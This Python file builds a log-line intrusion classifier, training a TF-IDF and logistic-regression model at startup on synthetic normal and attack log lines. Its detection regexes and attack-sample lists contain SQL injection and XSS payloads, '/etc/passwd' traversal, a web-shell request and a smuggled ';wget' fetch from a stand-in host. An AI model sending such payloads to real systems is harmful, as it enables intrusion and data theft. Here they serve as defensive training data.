"""TF-IDF + Logistic Regression intrusion classifier.

The model is trained when the app starts (takes about a second) from a labelled
sample of log lines, so there is no model file to lose or to break between
scikit-learn versions.
"""
import random
import re

from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline

IP_RE = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")
NUM_RE = re.compile(r"\d+")


def preprocess(line):
    t = line.lower()
    extra = []
    if "../" in t or "..%2f" in t or "/etc/passwd" in t:
        extra.append("pathtraversal")
    if "<script" in t or "%3cscript" in t or "javascript:" in t:
        extra.append("scripttag")
    if re.search(r"union(\s|%20|\+)+select|or(\s|%20|\+)+1=1|'--|drop(\s|%20|\+)+table", t):
        extra.append("sqlinjection")
    t = IP_RE.sub(" ipaddr ", t)
    t = NUM_RE.sub(" num ", t)
    return t + " " + " ".join(extra)


def _ip(r):
    return f"{r.choice([10, 172, 192, 203, 198])}.{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}"


NORMAL = [
    "{t} server sshd[{n}]: Accepted password for {u} from {ip} port {p} ssh2",
    "{t} server sshd[{n}]: pam_unix(sshd:session): session opened for user {u}",
    "{t} server sshd[{n}]: pam_unix(sshd:session): session closed for user {u}",
    "{t} server systemd[1]: Started Daily apt download activities",
    "{t} server systemd[1]: Started Session {n} of user {u}",
    "{t} server CRON[{n}]: ({u}) CMD (/usr/bin/backup.sh)",
    "{t} server kernel: eth0: link up, 1000 Mbps, full duplex",
    "{t} server nginx: {ip} - - \"GET /index.html HTTP/1.1\" 200 {n}",
    "{t} server nginx: {ip} - - \"GET /css/style.css HTTP/1.1\" 200 {n}",
    "{t} server nginx: {ip} - - \"GET /products HTTP/1.1\" 200 {n}",
    "{t} server nginx: {ip} - - \"POST /contact HTTP/1.1\" 302 {n}",
    "{t} System activity: user {u} logged in successfully",
    "{t} System activity: user {u} logged out",
    "{t} System activity: file report.pdf opened by {u}",
    "{t} System activity: scheduled backup completed successfully",
    "{t} System activity: software update installed successfully",
    "{t} System activity: service apache2 started",
    "{t} System activity: disk usage is {n} percent",
    "{t} System activity: user {u} updated profile settings",
    "{t} INFO application started on port {p}",
    "{t} INFO database connection established",
    "{t} INFO request completed in {n} ms",
    "{t} INFO user {u} uploaded document successfully",
    "{t} INFO health check passed",
    "{t} INFO email notification sent to {u}",
    "{t} NOTICE cache cleared by scheduler",
]

INTRUSION = [
    "{t} server sshd[{n}]: Failed password for root from {ip} port {p} ssh2",
    "{t} server sshd[{n}]: Failed password for invalid user {u} from {ip} port {p} ssh2",
    "{t} server sshd[{n}]: Invalid user {u} from {ip}",
    "{t} server sshd[{n}]: authentication failure; logname= uid=0 rhost={ip} user=root",
    "{t} server sshd[{n}]: Too many authentication failures for root from {ip}",
    "{t} server sshd[{n}]: Connection closed by authenticating user root {ip} [preauth]",
    "{t} server sudo: {u} : authentication failure ; command=/bin/bash",
    "{t} server kernel: possible SYN flooding on port 80. Sending cookies",
    "{t} server nginx: {ip} - - \"GET /products?id=1' OR 1=1-- HTTP/1.1\" 500 {n}",
    "{t} server nginx: {ip} - - \"GET /search?q=1 UNION SELECT username,password FROM users HTTP/1.1\" 500 {n}",
    "{t} server nginx: {ip} - - \"GET /download?file=../../etc/passwd HTTP/1.1\" 403 {n}",
    "{t} server nginx: {ip} - - \"GET /search?q=<script>alert(1)</script> HTTP/1.1\" 200 {n}",
    "{t} server nginx: {ip} - - \"GET /phpmyadmin HTTP/1.1\" 404 {n}",
    "{t} server nginx: {ip} - - \"GET /.env HTTP/1.1\" 404 {n}",
    "{t} server nginx: {ip} - - \"POST /login HTTP/1.1\" 401 {n}",
    "{t} server nginx: {ip} - - \"GET /wp-login.php HTTP/1.1\" 404 {n}",
    "{t} Security alert: multiple failed login attempts for user {u} from {ip}",
    "{t} Security alert: brute force attack detected from {ip}",
    "{t} Security alert: unauthorized access attempt to /admin by {ip}",
    "{t} Security alert: port scan detected from {ip}",
    "{t} Security alert: SQL injection attempt blocked from {ip}",
    "{t} Security alert: malware detected in file upload from {ip}",
    "{t} Security alert: privilege escalation attempt by user {u}",
    "{t} Security alert: ddos attack traffic spike from {ip}",
    "{t} WARNING failed login for user {u} from {ip}: invalid password",
    "{t} WARNING account {u} locked after repeated failed login attempts",
    "{t} ERROR access denied for user {u}: permission denied on /etc/shadow",
    "{t} ERROR firewall blocked suspicious connection from {ip}",
    "{t} EventID 4625 An account failed to log on. Account Name {u} Source {ip}",
    "{t} ALERT suspicious activity: unknown user {u} attempted root login from {ip}",
]


NORMAL_PATHS = ["/", "/index.html", "/about", "/products", "/contact", "/css/style.css",
                "/js/app.js", "/images/logo.png", "/blog/post-1", "/api/items", "/favicon.ico",
                "/dashboard", "/products?id=5", "/search?q=laptop", "/static/main.css"]
ATTACK_PATHS = ["/products?id=1' OR 1=1--", "/products?id=1 UNION SELECT username,password FROM users",
                "/search?q=1;DROP TABLE users", "/search?q=<script>alert(1)</script>",
                "/download?file=../../etc/passwd", "/..%2f..%2fetc/passwd", "/phpmyadmin",
                "/.env", "/.git/config", "/wp-login.php", "/admin", "/backup.sql",
                "/config.php", "/shell.php?cmd=cat /etc/passwd", "/cgi-bin/test.cgi?;wget http://x/m.sh"]
COMBINED = '{ip} - - [{d}/Nov/2026:{h:02d}:{m:02d}:{s:02d} +0530] "{method} {path} HTTP/1.1" {status} {n} "-" "Mozilla/5.0"'


def _build_dataset(per_template=14, seed=42):
    r = random.Random(seed)
    users = ["admin", "root", "alice", "bob", "guest", "test", "ubuntu", "sabitha", "john", "deploy"]
    X, y = [], []
    for label, templates in ((0, NORMAL), (1, INTRUSION)):
        for tpl in templates:
            for _ in range(per_template):
                X.append(tpl.format(
                    t=f"{r.choice(['Jan', 'Feb', 'Mar', 'Nov'])} {r.randint(1, 28)} {r.randint(0, 23):02d}:{r.randint(0, 59):02d}:{r.randint(0, 59):02d}",
                    n=r.randint(100, 99999), p=r.randint(1024, 65000),
                    u=r.choice(users), ip=_ip(r)))
                y.append(label)
    # Apache / Nginx "combined" format lines
    for _ in range(260):
        X.append(COMBINED.format(ip=_ip(r), d=r.randint(1, 28), h=r.randint(0, 23), m=r.randint(0, 59),
                                 s=r.randint(0, 59), method=r.choice(["GET", "GET", "GET", "POST"]),
                                 path=r.choice(NORMAL_PATHS), status=r.choice([200, 200, 200, 304, 302]),
                                 n=r.randint(100, 99999)))
        y.append(0)
    for _ in range(260):
        X.append(COMBINED.format(ip=_ip(r), d=r.randint(1, 28), h=r.randint(0, 23), m=r.randint(0, 59),
                                 s=r.randint(0, 59), method=r.choice(["GET", "POST"]),
                                 path=r.choice(ATTACK_PATHS), status=r.choice([200, 400, 403, 404, 500]),
                                 n=r.randint(100, 99999)))
        y.append(1)
    for _ in range(80):  # repeated failed logins
        X.append(COMBINED.format(ip=_ip(r), d=r.randint(1, 28), h=r.randint(0, 23), m=r.randint(0, 59),
                                 s=r.randint(0, 59), method="POST", path="/login",
                                 status=r.choice([401, 403]), n=r.randint(100, 999)))
        y.append(1)
    return X, y


def train():
    X, y = _build_dataset()
    pipe = Pipeline([
        ("tfidf", TfidfVectorizer(preprocessor=preprocess, ngram_range=(1, 2),
                                  token_pattern=r"[a-z_]{2,}", sublinear_tf=True)),
        ("clf", LogisticRegression(max_iter=1000, C=5.0)),
    ])
    pipe.fit(X, y)
    return pipe


_MODEL = train()


def classify_text(text, line_threshold=0.5):
    """Return (prediction, total_lines, intrusion_lines) for a whole log file."""
    lines = [l.strip() for l in text.splitlines() if l.strip()][:50000]
    if not lines:
        return None, 0, 0
    probs = _MODEL.predict_proba(lines)[:, 1]
    bad = int((probs >= line_threshold).sum())
    prediction = "Intrusion Detected" if bad >= 1 else "Normal File"
    return prediction, len(lines), bad
